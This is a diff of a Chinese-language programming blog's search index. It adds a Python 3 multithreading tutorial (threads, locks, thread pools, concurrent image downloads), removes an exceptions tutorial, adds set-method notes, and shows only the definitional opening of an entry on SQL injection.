@@ -126,6 +126,70 @@
       </tags>
   </entry>
   <entry>
+    <title>Python3-多线程</title>
+    <url>//bc0a390cf17d.html</url>
+    <content><![CDATA[<h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>​        线程（Thread）是操作系统能够进行运算调度的最小单位。被包含在进程中，是进程中的实际运作单位。</p>
+<p>一个进程中可以有多个线程，每个线程并执行不同的任务。</p>
+<h2 id="Threading模块"><a href="#Threading模块" class="headerlink" title="Threading模块"></a>Threading模块</h2><p>语法：</p>
+<p><code>threading.Thread(group=None,target=None,name=None,args=(),kwargs=&#123;&#125;,daemon=None)</code></p>
+<ul>
+<li>group：值为<code>None</code>，为了之后扩展<code>ThreadGroup</code>类而保留</li>
+<li>target：表示一个可调用对象，线程启动时，<code>run()</code>方法将调用此对象，默认值为<code>None</code>，表示不调用任何内容</li>
+<li>name：表示当前线程名称，默认创建一个Thread-N格式的唯一名称</li>
+<li>args：表示传递给target函数的参数元组</li>
+<li>kwargs：表示传递给target函数的参数字典</li>
+<li>daemon：用于设置是否为守护模式，默认值为<code>None</code>,线程将继承当前线程的守护模式属性</li>
+</ul>
+<p><code>threading.Thread</code>方法</p>
+<table>
+<thead>
+<tr>
+<th align="center">函数</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">start()</td>
+<td align="center">线程的开始</td>
+</tr>
+<tr>
+<td align="center">join()</td>
+<td align="center">线程的阻塞，用于线程结束后再执行后面的代码</td>
+</tr>
+<tr>
+<td align="center">run()</td>
+<td align="center">定义线程功能的方法（通常在子类中被应用开发者重写）</td>
+</tr>
+<tr>
+<td align="center">name</td>
+<td align="center">返回线程的名字</td>
+</tr>
+</tbody></table>
+<div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">例1</button></li><li class="tab"><button type="button" data-href="#-2">例2</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">time</span>():</span></span><br><span class="line">    i = <span class="number">10</span></span><br><span class="line">    <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;this is&quot;</span>, i, <span class="string">&quot;number is&quot;</span>, threading.Thread(target=time).name)</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    add_thread = []</span><br><span class="line">    add_thread.append(threading.Thread(target=time))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> add_thread:</span><br><span class="line">        i.start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> add_thread:</span><br><span class="line">        i.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">timeing</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;睡眠一秒钟&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;睡眠结束&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    start = time.perf_counter()</span><br><span class="line">    add_thread = []</span><br><span class="line">    <span class="comment"># 创建一个列表，并使用循环创建十个线程添加到列表里</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        add_thread.append(threading.Thread(target=timeing))</span><br><span class="line">    <span class="comment"># 开始十个线程</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> add_thread:</span><br><span class="line">        i.start()</span><br><span class="line">    <span class="comment"># 阻塞十个线程,用于在线程完成之后再执行后面的代码</span></span><br><span class="line">    <span class="comment"># start()和join()不能在循环里面放在一起使用,不然就会结束一个线程后才开始下一个线程</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> add_thread:</span><br><span class="line">        i.join()</span><br><span class="line">    finish = time.perf_counter()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;结束在&quot;</span>, <span class="built_in">round</span>(finish - start, <span class="number">2</span>), <span class="string">&quot;秒&quot;</span>)</span><br><span class="line">    <span class="comment"># 返回代码执行的时间</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line">睡眠一秒钟</span><br><span class="line">...</span><br><span class="line">睡眠结束</span><br><span class="line">...</span><br><span class="line">结束在 <span class="number">1.0</span> 秒</span><br><span class="line"><span class="comment"># 这里可以看到我们使用线程后，可以同时执行十次代码，所有的线程都是一秒内执行结束</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
+
+
+
+<h2 id="线程锁定"><a href="#线程锁定" class="headerlink" title="线程锁定"></a>线程锁定</h2><p>避免数值被多个线程作相同的修改</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">time</span>():</span></span><br><span class="line">    i = <span class="number">10</span></span><br><span class="line">  	<span class="comment"># 建立Lock()对象</span></span><br><span class="line">    lock = threading.Lock()</span><br><span class="line">    <span class="comment"># 锁定</span></span><br><span class="line">    <span class="comment"># 获得锁，成功获得锁定后返回 True</span></span><br><span class="line">    lock.acquire()</span><br><span class="line">    <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;this is&quot;</span>, i, <span class="string">&quot;number is&quot;</span>, threading.Thread(target=time).name)</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">    <span class="comment"># 释放</span></span><br><span class="line">    lock.release()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    add_thread = []</span><br><span class="line">    add_thread.append(threading.Thread(target=time))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> add_thread:</span><br><span class="line">        i.start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> add_thread:</span><br><span class="line">        i.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">创建线程池</button></li><li class="tab"><button type="button" data-href="#-2">使用列表迭代</button></li><li class="tab"><button type="button" data-href="#-3">map()函数映射</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> concurrent.futures</span><br><span class="line"></span><br><span class="line">start = time.perf_counter()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">timeing</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;睡眠&quot;</span>,s,<span class="string">&quot;秒钟&quot;</span>)</span><br><span class="line">    time.sleep(s)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;睡眠结束&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># with concurrent.futures.ThreadPoolExecutor() as executor:</span></span><br><span class="line"><span class="comment">#     results = []</span></span><br><span class="line"><span class="comment">#     for _ in range(10):</span></span><br><span class="line"><span class="comment">#         results.append(executor.submit(timeing,1))</span></span><br><span class="line"><span class="comment">#     for f in concurrent.futures.as_completed(results):</span></span><br><span class="line"><span class="comment">#         print(f.result())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可以使用列表推导式来写代码 </span></span><br><span class="line"><span class="keyword">with</span> concurrent.futures.ThreadPoolExecutor() <span class="keyword">as</span> executor:</span><br><span class="line">    results = [executor.submit(timeing,<span class="number">1</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> concurrent.futures.as_completed(results):</span><br><span class="line">        <span class="built_in">print</span>(f.result())</span><br><span class="line">        </span><br><span class="line">finish = time.perf_counter()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;结束在&quot;</span>, <span class="built_in">round</span>(finish - start, <span class="number">2</span>), <span class="string">&quot;秒&quot;</span>)</span><br><span class="line"></span><br><span class="line">睡眠一秒钟</span><br><span class="line">...</span><br><span class="line">睡眠结束</span><br><span class="line">...</span><br><span class="line">结束在 <span class="number">1.0</span> 秒</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> concurrent.futures</span><br><span class="line"></span><br><span class="line">start = time.perf_counter()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">timeing</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;睡眠&quot;</span>,s,<span class="string">&quot;秒钟&quot;</span>)</span><br><span class="line">    time.sleep(s)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;睡眠结束&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> concurrent.futures.ThreadPoolExecutor() <span class="keyword">as</span> executor:</span><br><span class="line">    secs = [<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line">    results = [executor.submit(timeing,sec) <span class="keyword">for</span> sec <span class="keyword">in</span> secs]</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> concurrent.futures.as_completed(results):</span><br><span class="line">        <span class="built_in">print</span>(f.result())</span><br><span class="line">        </span><br><span class="line">finish = time.perf_counter()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;结束在&quot;</span>, <span class="built_in">round</span>(finish - start, <span class="number">2</span>), <span class="string">&quot;秒&quot;</span>)</span><br><span class="line"></span><br><span class="line">睡眠<span class="number">5</span>秒钟</span><br><span class="line">睡眠<span class="number">4</span>秒钟</span><br><span class="line">...</span><br><span class="line">睡眠结束</span><br><span class="line">...</span><br><span class="line">结束在 <span class="number">5.0</span> 秒</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> concurrent.futures</span><br><span class="line"></span><br><span class="line">start = time.perf_counter()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">timeing</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;睡眠&quot;</span>,s,<span class="string">&quot;秒钟&quot;</span>)</span><br><span class="line">    time.sleep(s)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;睡眠结束&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> concurrent.futures.ThreadPoolExecutor() <span class="keyword">as</span> executor:</span><br><span class="line">    secs = [<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line">    results = executor.<span class="built_in">map</span>(timeing,secs)</span><br><span class="line">    <span class="comment"># 即使for循环被注释也可以成功执行，但是不会return返回值</span></span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">        </span><br><span class="line">finish = time.perf_counter()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;结束在&quot;</span>, <span class="built_in">round</span>(finish - start, <span class="number">2</span>), <span class="string">&quot;秒&quot;</span>)</span><br><span class="line"></span><br><span class="line">睡眠<span class="number">5</span>秒钟</span><br><span class="line">睡眠<span class="number">4</span>秒钟</span><br><span class="line">...</span><br><span class="line">睡眠结束</span><br><span class="line">...</span><br><span class="line">结束在 <span class="number">5.0</span> 秒</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
+
+
+
+<h2 id="下载图片"><a href="#下载图片" class="headerlink" title="下载图片"></a>下载图片</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> concurrent.futures</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">urls = [<span class="string">&#x27;url1&#x27;</span>,<span class="string">&#x27;url2&#x27;</span>...]</span><br><span class="line">start = time.perf_counter()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_image</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="comment"># 获取图片的字节</span></span><br><span class="line">    img_bytes = requests.get(url).content</span><br><span class="line">    <span class="comment"># 获取图片名字</span></span><br><span class="line">    <span class="comment"># 也可以写成xxx.split(&#x27;/&#x27;)[-1],这样就永远获取最后一个</span></span><br><span class="line">    <span class="comment"># https://xxx.com/[3]/[4]/[5]</span></span><br><span class="line">    img_name = url.split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">5</span>]</span><br><span class="line">    <span class="comment"># 如果url后面没有带格式，可以用如下代码为文件添加后缀</span></span><br><span class="line">    <span class="comment"># img_name = f&#x27;&#123;img_name&#125;.jpg&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(img_name,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> img_file:</span><br><span class="line">        img_file.write(img_bytes)</span><br><span class="line">        <span class="built_in">print</span>(img_name,<span class="string">&quot;downloading...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> concurrent.futures.ThreadPoolExecutor() <span class="keyword">as</span> executor:</span><br><span class="line">    executor.<span class="built_in">map</span>(download_image,urls)</span><br><span class="line"></span><br><span class="line">finish = time.perf_counter()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;结束在&quot;</span>, <span class="built_in">round</span>(finish - start, <span class="number">2</span>), <span class="string">&quot;秒&quot;</span>)</span><br><span class="line"></span><br><span class="line">wallhaven-gj977q.png downloading...</span><br><span class="line">wallhaven-zm23vw.jpg downloading...</span><br><span class="line">结束在 <span class="number">1.62</span> 秒</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Python3</category>
+        <category>Python3进阶</category>
+      </categories>
+      <tags>
+        <tag>Python3</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SQL注入漏洞</title>
     <url>//9958bd672d7e.html</url>
     <content><![CDATA[<h2 id="SQL注入漏洞简介"><a href="#SQL注入漏洞简介" class="headerlink" title="SQL注入漏洞简介"></a>SQL注入漏洞简介</h2><p>​        SQL 注入（SQL Injection）是发生在 Web 程序中数据库层的安全漏洞，是网站存在最多也是最简单的漏洞。主要原因是程序对用户输入数据的合法性没有判断和处理，导致攻击者可以在 Web 应用程序中事先定义好的 SQL 语句中添加额外的 SQL 语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步获取到数据信息。</p>
@@ -856,130 +920,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Python3-异常</title>
-    <url>//fc7cf6eade53.html</url>
-    <content><![CDATA[<h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><p>程序运行过程当中，不可避免的会出现一些错误</p>
-<p>这些错误在过程中，我们称之为异常</p>
-<h2 id="处理异常"><a href="#处理异常" class="headerlink" title="处理异常"></a>处理异常</h2><p>程序运行时出现异常，目的并不是让我们的程序直接终止<br>我们可以在出现异常时，编写代码对异常进行处理<br>避免因为一个异常导致程序的终止</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> 语句</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		代码块（可能出现错误的语句）</span><br><span class="line">	<span class="comment"># 如果except后不跟任何内容，会捕获所有的异常</span></span><br><span class="line">	<span class="comment"># 如果跟着异常的类型，只会捕获相关异常</span></span><br><span class="line">	<span class="comment"># 如果既想捕获所有异常，又想捕获某一异常，可以写多个except语句</span></span><br><span class="line">	<span class="comment"># Exception 是所有异常的父类，如果except后跟的是Exception，他也会捕获到所有的异常</span></span><br><span class="line">	<span class="keyword">except</span> 异常类型 <span class="keyword">as</span> 异常名:</span><br><span class="line">		代码块（出现错误以后的处理方式）</span><br><span class="line">	<span class="keyword">except</span> 异常类型 <span class="keyword">as</span> 异常名:</span><br><span class="line">		代码块（出现错误以后的处理方式）</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		代码块（没出现错误时执行的语句）</span><br><span class="line">	<span class="keyword">finally</span>:</span><br><span class="line">		代码块（无论是否有异常，该代码总会执行）</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把异常用as的方式赋值给变量</span></span><br><span class="line"><span class="keyword">except</span> 异常 <span class="keyword">as</span> x</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="抛出异常"><a href="#抛出异常" class="headerlink" title="抛出异常"></a>抛出异常</h2><p>如果在函数中对异常进行处理，异常便不会影响程序<br>如果不对函数的异常进行处理，异常会传递到函数的调用处<br>出现异常后，所有异常信息会保存在一个专门保存异常的对象中<br>异常传播时，会调用这个保存异常的对象<br>比如 ：<br>    ZeroDivisionError类的对象专门用来表示除0的异常<br>    NameError类的对象专门用来处理变量错误的异常</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">可以使用 <span class="keyword">raise</span> 语句来抛出异常</span><br><span class="line"><span class="comment"># raise用于向外部抛出异常，后边可以跟一个异常类，或异常类的实例</span></span><br><span class="line"><span class="comment"># raise Exception</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">a,b</span>):</span></span><br><span class="line">	<span class="keyword">if</span> a &lt; <span class="number">0</span> <span class="keyword">or</span> b &lt; <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">raise</span> Exception(<span class="string">&#x27;两个参数中不能有负数&#x27;</span>)</span><br><span class="line">	<span class="keyword">return</span> a+b</span><br><span class="line"><span class="built_in">print</span>(add(-<span class="number">123</span>,<span class="number">456</span>))</span><br><span class="line"><span class="comment"># 也可以自定义异常类，只需要创建一个类继承Exception即可</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyError</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h2><p>一般用于对程序某个时刻必须满足的条件进行验证</p>
-<p>因为<code>assert</code>条件为<code>False</code>才会执行</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">a,b</span>):</span></span><br><span class="line">	<span class="keyword">assert</span> a &lt; <span class="number">0</span> <span class="keyword">and</span> b &lt; <span class="number">0</span>,<span class="string">&quot;两个参数中不能有负数&quot;</span> </span><br><span class="line">	<span class="keyword">return</span> a+b</span><br><span class="line"><span class="built_in">print</span>(add(-<span class="number">123</span>,<span class="number">456</span>))</span><br><span class="line"><span class="comment"># 这里or是找True，所以不合适，应该使用and，找False</span></span><br><span class="line"><span class="comment"># a &lt; 0为True,所以不抛出异常,b&lt;0为False，所以抛出异常</span></span><br><span class="line">可以写成</span><br><span class="line"><span class="keyword">assert</span> a &gt; <span class="number">0</span> <span class="keyword">and</span> b &gt; <span class="number">0</span>,<span class="string">&quot;两个参数中不能有负数&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可以用try语句控制</span></span><br><span class="line">a = -<span class="number">123</span></span><br><span class="line">b = <span class="number">456</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    add(a,b)</span><br><span class="line"><span class="keyword">except</span> AssertionError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;输入有误：&quot;</span>, e)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(add(a,b))</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="内置异常"><a href="#内置异常" class="headerlink" title="内置异常"></a>内置异常</h2><ul>
-<li>Exception：所有异常的父类<ul>
-<li>SystemExit：解释器请求退出</li>
-<li>KeyboardInterrupt：用户中断执行</li>
-<li>GeneratorExit：生成器发生异常来通知退出</li>
-<li>Exception：常规错误的父类<ul>
-<li>StopIteration：迭代器没有更多的值</li>
-<li>StopAsyncIteration：必须通过异步迭代器对象的__anext__()方法引发以停止迭代</li>
-<li>ArithmeticError：所有数值计算错误的基类<ul>
-<li>FloatingPointError：浮点数计算错误</li>
-<li>OverflowError：数值运算超出最大限制</li>
-<li>ZeroDivisionError：除(或取模)零所有数据类型</li>
-</ul>
-</li>
-<li>AssertionError：当<code>assert</code>语句判定<code>False</code>，断言失败</li>
-<li>AttributeError：对象中没有这个属性</li>
-<li>BufferError：与缓冲区相关的操作引发</li>
-<li>EOFError：没有内建输入，到达EOF标记</li>
-<li>ImportError：导入模块失败<ul>
-<li>ModuleNotFoundError：找不到模块</li>
-</ul>
-</li>
-<li>LookupError：无效数据查询<ul>
-<li>IndexError：序列中没有此索引</li>
-<li>KeyError：映射中没有这个键</li>
-</ul>
-</li>
-<li>MemoryError：内存溢出错误</li>
-<li>NameError：未声明，初始化对象<ul>
-<li>UnboundLocalError：访问未初始化的本地变量</li>
-</ul>
-</li>
-<li>OSError：操作系统错误<ul>
-<li>BlockingIOError：操作将阻塞对象设置为非阻塞操作</li>
-<li>ChildProcessError：子进程上的操作失败</li>
-<li>ConnectionError：与链接相关的异常<ul>
-<li>BrokenPipeError：在关闭写入的套接字上写入</li>
-<li>ConnectionAbortedError：链接被对方终止</li>
-<li>ConnectionRefusedError：链接被对方拒绝</li>
-<li>ConnectionResetError：链接被对方重置</li>
-</ul>
-</li>
-<li>FileExistsError：创建已存在的文件或者目录</li>
-<li>FileNotFoundError：请求文件或者目录不存在</li>
-<li>InterruptedError：系统调用被输入信号中断</li>
-<li>IsADirectoryError：在目录上请求文件</li>
-<li>NotADirectoryError：在不是目录事物上请求目录操作</li>
-<li>PermissionError：没有访问权限</li>
-<li>ProcessLookupError：进程不存在</li>
-<li>TimeoutError：系统函数在系统级别超时</li>
-</ul>
-</li>
-<li>ReferenceError：弱引用试图访问已经垃圾回收了的对象</li>
-<li>RuntimeError：一般的运行时错误<ul>
-<li>NotImplementedError：尚未实现的方法</li>
-<li>RecursionError：解释器检测到超出最大递归深度</li>
-</ul>
-</li>
-<li>SyntaxError：Python语法错误<ul>
-<li>IndentationError：缩进错误<ul>
-<li>TabError：Tab和空格混用</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>SystemError：系统错误</li>
-<li>TypeError：类型错误</li>
-<li>ValueError：传入无效的参数<ul>
-<li>UnicodeError：Unicode 相关的错误<ul>
-<li>UnicodeDecodeError：Unicode 解码时的错误</li>
-<li>UnicodeEncodeError：Unicode 编码时错误</li>
-<li>UnicodeTranslateError：Unicode 转换时错误</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Warning：警告的错误<ul>
-<li>DeprecationWarning：关于被弃用的特征的警告</li>
-<li>PendingDeprecationWarning：关于构造将来语义会有改变的警告</li>
-<li>RuntimeWarning：可疑的运行行为的警告</li>
-<li>SyntaxWarning：可疑的语法的警告</li>
-<li>UserWarning：用户代码生成的警告</li>
-<li>FutureWarning：有关已弃用功能的警告的基类</li>
-<li>ImportWarning：模块导入时可能出错的警告的基类</li>
-<li>UnicodeWarning：与Unicode相关的警告的基类</li>
-<li>BytesWarning：bytes和bytearray相关的警告的基类</li>
-<li>ResourceWarning：与资源使用相关的警告的基类</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>Python3</category>
-        <category>Python3基础</category>
-      </categories>
-      <tags>
-        <tag>Python3</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Python3-数组</title>
     <url>//ecee3d177b80.html</url>
     <content><![CDATA[<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><ul>
@@ -1105,6 +1045,130 @@
 
 <h3 id="方法-2"><a href="#方法-2" class="headerlink" title="方法"></a>方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">	对象.方法(条件)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add() 向集合中添加元素</span></span><br><span class="line">对象名.add(元素)</span><br><span class="line"></span><br><span class="line"><span class="comment"># update() 将一个集合中的元素添加到当前集合中</span></span><br><span class="line"><span class="comment"># update()可以传递序列或字典作为参数，字典只会使用键</span></span><br><span class="line">s2 = <span class="built_in">set</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">对象<span class="number">1.</span>update(对象<span class="number">2</span>)</span><br><span class="line">对象名.update([元素<span class="number">1</span>，元素<span class="number">2.</span>.....])</span><br><span class="line">对象名.update(&#123;key:value,key:value.......&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pop()随机删除并返回一个集合中的元素</span></span><br><span class="line">变量 = 对象名.pop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># remove()删除集合中的指定元素</span></span><br><span class="line">对象名.remove(元素)</span><br><span class="line"></span><br><span class="line"><span class="comment"># clear()清空集合</span></span><br><span class="line">对象名.clear()</span><br><span class="line"></span><br><span class="line"><span class="comment"># copy()对集合进行浅复制</span></span><br><span class="line">变量 = 对象名.copy()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在对集合做运算时，不会影响原来的集合，而是返回一个运算结果</span></span><br><span class="line"><span class="comment"># 创建两个集合</span></span><br><span class="line">s = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;</span><br><span class="line">s2 = &#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># &amp; 交集运算</span></span><br><span class="line">result = s &amp; s2 <span class="comment"># &#123;3, 4, 5&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># | 并集运算</span></span><br><span class="line">result = s | s2 <span class="comment"># &#123;1,2,3,4,5,6,7&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># - 差集</span></span><br><span class="line">result = s - s2 <span class="comment"># &#123;1, 2&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ^ 异或集 获取只在一个集合中出现的元素</span></span><br><span class="line">result = s ^ s2 <span class="comment"># &#123;1, 2, 6, 7&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;= 检查一个集合是否是另一个集合的子集</span></span><br><span class="line"><span class="comment"># 如果a集合中的元素全部都在b集合中出现，那么a集合就是b集合的子集，b集合是a集合超集</span></span><br><span class="line">a = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line">b = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;</span><br><span class="line"></span><br><span class="line">result = a &lt;= b <span class="comment"># True</span></span><br><span class="line">result = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; &lt;= &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; <span class="comment"># True</span></span><br><span class="line">result = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125; &lt;= &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; <span class="comment"># False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt; 检查一个集合是否是另一个集合的真子集</span></span><br><span class="line"><span class="comment"># 如果超集b中含有子集a中所有元素，并且b中还有a中没有的元素，则b就是a的真超集，a是b的真子集</span></span><br><span class="line">result = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; &lt; &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; <span class="comment"># False</span></span><br><span class="line">result = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; &lt; &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125; <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line">difference()	返回包含两个或更多集合之间差异的集合。</span><br><span class="line">difference_update()	删除此集合中也包含在另一个指定集合中的项目。</span><br><span class="line">discard()	删除指定项目。</span><br><span class="line">intersection()	